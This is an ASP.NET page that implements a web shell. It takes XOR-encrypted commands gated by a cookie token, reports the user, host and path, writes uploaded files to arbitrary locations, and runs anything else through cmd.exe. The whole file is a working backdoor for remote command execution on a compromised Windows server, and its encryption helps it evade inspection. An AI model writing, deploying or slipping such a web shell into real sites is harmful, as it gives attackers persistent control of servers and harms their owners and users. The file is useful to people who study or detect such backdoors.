<%@ Page Language="C#" %>
<%@ Import Namespace="System" %>
<%@ Import Namespace="System.Text" %>
<%@ Import Namespace="System.Web" %>
<%@ Import Namespace="System.IO" %>

<script runat="server">
    void Page_Load(object sender, EventArgs e)
    {
        if (Request.Form["data"] != null)
        {
            if (Request.Cookies["auth_token"].Value == "<HASH>")
            {
                string key = "<KEY>";
                StringBuilder decryptedData = new StringBuilder();
                StringBuilder encryptedData = new StringBuilder();
                
                string data = Encoding.UTF8.GetString(Convert.FromBase64String(Request.Form["data"]));
                decryptedData = XOR(Encoding.UTF8.GetBytes(data), key);
                
                string result = ""; // Declare 'result' outside the if-else blocks
                
                if (decryptedData.ToString().Contains(":username"))
                {
                    result = Environment.UserName;
                }
                else if (decryptedData.ToString().Contains(":hostname"))
                {
                    result = Environment.MachineName;
                }
                else if (decryptedData.ToString().Contains(":pwd"))
                {
                    result = Page.MapPath(".") + "/";
                    result = result.Replace("\\", "/");
                    result = result.Replace("//", "/");
                }
                else if (decryptedData.ToString().Contains(":upload"))
                {
                    string[] parts = decryptedData.ToString().Split(' ');
                    string filePath = parts[1];
                    byte[] fileData = Convert.FromBase64String(parts[2]);
                    result = UploadFile(filePath, fileData);
                    /*
                   byte[] fileBytes = Convert.FromBase64String(fileData);
                        System.IO.File.WriteAllBytes(filePath, fileBytes);
                        result = "File written successfully.";
                    */
                }
                else
                {
                    result = SystemFunction(decryptedData.ToString());
                }
                
                encryptedData = XOR(Encoding.UTF8.GetBytes(result), key);
                string encodedResult = Convert.ToBase64String(Encoding.UTF8.GetBytes(encryptedData.ToString()));
                Response.Write(encodedResult);
            }
            else
            {
                Response.StatusCode = 403;
                Response.End();
            }
        }
    }

    // System-like function to execute cmd.exe /c
    string SystemFunction(string command)
    {
        System.Diagnostics.Process process = new System.Diagnostics.Process();
        process.StartInfo.FileName = "cmd.exe";
        process.StartInfo.Arguments = "/c " + command;
        process.StartInfo.UseShellExecute = false;
        process.StartInfo.RedirectStandardOutput = true;
        process.StartInfo.RedirectStandardError = true;
        process.Start();
        string output = process.StandardOutput.ReadToEnd();
        process.WaitForExit();
        return output;
    }

    // XOR function
    StringBuilder XOR(byte[] data, string key)
    {
        StringBuilder result = new StringBuilder();
        for (int i = 0; i < data.Length; i++)
        {
            result.Append((char)(data[i] ^ key[i % key.Length]));
        }
        return result;
    }

    // Upload function
    string UploadFile(string filePath, byte[] fileData)
    {
        try
        {
            // Get the length of the file data
            int fileLength = fileData.Length; // Use fileData.Length instead of ContentLength

            // Create a buffer with the length of the file data
            byte[] buffer = new byte[fileLength];
            Array.Copy(fileData, buffer, fileLength); // Copy fileData to buffer

            // Create a FileInfo object for the destination path
            FileInfo fileInfo = new FileInfo(filePath); // Use the provided filePath

            // Write the buffer to a new file
            using (FileStream fileStream = new FileStream(Path.Combine(fileInfo.DirectoryName, Path.GetFileName(filePath)), FileMode.Create))
            {
                fileStream.Write(buffer, 0, buffer.Length);
            }

            return "File written sucessfully";
        }
        catch (Exception ex)
        {
            return ex.ToString();
        }
    }
</script>
